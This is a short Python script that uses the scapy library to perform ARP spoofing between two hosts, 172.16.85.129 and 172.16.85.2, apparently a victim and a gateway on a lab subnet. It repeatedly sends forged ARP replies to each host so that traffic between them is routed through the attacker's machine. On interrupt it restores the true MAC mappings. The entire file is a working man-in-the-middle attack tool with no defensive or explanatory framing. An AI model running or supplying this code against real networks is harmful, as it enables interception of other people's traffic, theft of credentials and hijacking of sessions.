import scapy.all as scapy
import time

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_request_broadcast = broadcast / arp_request
	answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered[0][1].hwsrc
	# print(answered[0][1].hwsrc)


def spoof_us(target_ip, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
	# print(packet.show())
	# print(packet.summary())
	scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), 
					   psrc=source_ip, hwsrc=get_mac(source_ip))
	scapy.send(packet, count=4, verbose=False)


count = 0
try:
	while True:
		pass
		spoof_us('172.16.85.129', '172.16.85.2')
		spoof_us('172.16.85.2', '172.16.85.129')
		print(f'\rh3llo {count}', end='')
		count += 2
		time.sleep(2)

except KeyboardInterrupt:
	print('\nuser stopped the program ..resetting macs')
	restore('172.16.85.129', '172.16.85.2')
	restore('172.16.85.2', '172.16.85.129')